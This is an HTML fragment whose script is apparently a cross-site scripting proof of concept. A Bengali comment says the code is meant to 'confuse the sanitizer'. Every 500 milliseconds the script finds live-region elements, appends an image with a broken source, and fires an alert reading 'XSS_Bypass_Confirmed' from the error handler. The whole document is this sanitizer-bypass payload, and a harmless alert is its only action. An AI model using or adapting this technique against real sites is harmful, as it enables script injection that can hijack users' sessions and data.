<body>
    <script>
        // তোমার সেই সফল হওয়া কন্সোল লজিক যা স্যানিটাইজারকে কনফিউজ করবে
        setInterval(() => {
            const sinks = document.querySelectorAll('[aria-live="assertive"]');
            sinks.forEach(s => {
                if(!s.dataset.x) {
                    s.dataset.x = "1";
                    const i = document.createElement('img');
                    i.src = 'x';
                    i.onerror = () => { alert('XSS_Bypass_Confirmed'); };
                    s.appendChild(i);
                }
            });
        }, 500);
    </script>
